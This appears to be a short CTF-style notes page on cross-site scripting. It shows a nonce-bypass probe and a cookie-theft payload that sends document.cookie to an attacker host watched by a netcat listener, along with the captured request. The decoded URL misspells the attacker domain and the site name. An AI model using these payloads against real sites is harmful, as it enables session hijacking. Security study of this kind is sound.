# XSS
<!-- brief: Some snippets of code about cross-site scripting -->
<!-- keywords: cookie, intercept, script, attributes -->
XSS is cross-site scripting. This page just lists some tips and snippets of code:
- [Check for script attributes](#check-for-script-attributes)
- [Intercept a cookie](#intercept-a-cookie)

## Check for script attributes
<!-- brief: Just a reminder to check for attributes in a script tag -->
<!-- keywords: xss, cross site-scripting, attributes, tag -->
When testing whether a site is vulnerable to XSS, you may try something like:
```
https://some.vuln.site?name=<script>alert(1)</script>
```
You can see your script code in the page, but no alert appeared. Check whether other scripts on the page have an attribute that may be needed to execute scripts. For example:
```
http://some.vuln.site/?name=<script%20nonce=LRGWAXOY98Es0zz0QOVmag==>alert(1)</script>
```
## Intercept a cookie
<!-- brief: Intercept a cookie sent to a webpage from another (usually 'admin') site -->
<!-- keywords: xss, cross site-scripting, cookie, intercept -->
In one CTF, there was an Admin server that could send a cookie to another server, and we needed to intercept that cookie.

To intercept it, we set up a *netcat* listener, so we could send the cookie to it:
```
$ nc -nlvk 8080
Listening on 0.0.0.0 8080
```
Now we went to the admin server for the challenge, and gave it a URL that would visit the target site, get the cookie and send it to us in a *GET* variable:
```
https://some.vuln.site/?name=<script%20nonce%3DLRGWAXOY98Es0zz0QOVmag%3D%3D>var%20a%3Ddocument.cookie%3B%20document.location%3D%60http:%2F%2Fcr4ck3rs.com:8080%2F%3Fc%3D%24%7Ba%7D%60<%2Fscript>
```
Without the URL encoding, this is:
```
https://some/vuln.site/?name=<script nonce="LRGWAXOY98Es0zz0QOVmag==">var a=document.cookie; document.location=`http://cr4ckers.com:8080/?c=${a}`</script>
```
In the *netcat* listener, we see something like this:
```
Connection received on 35.203.246.8 20340
GET /?c=secret=4b36b1b8e47f761263796b1defd80745 HTTP/1.1
Host: cr4ck3rs.com:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
```
With the cookie contents on the *GET* line.